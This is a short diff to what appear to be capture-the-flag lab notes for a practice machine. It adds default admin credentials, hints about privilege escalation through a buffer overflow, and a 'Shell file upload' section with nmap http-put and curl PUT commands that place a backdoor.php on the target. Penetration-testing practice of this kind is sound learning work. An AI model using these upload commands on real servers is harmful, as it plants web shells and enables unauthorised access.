@@ -56,7 +56,8 @@ Nikto:
 
 admin:admin
 
-password is:skoupidotenekes ?
+password is: skoupidotenekes ?
+user: admin
 
 Spoilers
 
@@ -71,3 +72,10 @@ Spoilers
    login the admin page > curl is a friend
 
    priv esc > binary bof exploit development > bof in corlan team
+
+
+Shell file upload
+  nmap -p 80 --script http-put --script-args http-put.url='/admin.php/backdoor.php',http-put.file='backdoor.php' 10.10.10.27 -v
+
+  curl --upload-file test.txt -v --url http://target/test/test.txt
+    OR you can also do: curl -X PUT -d
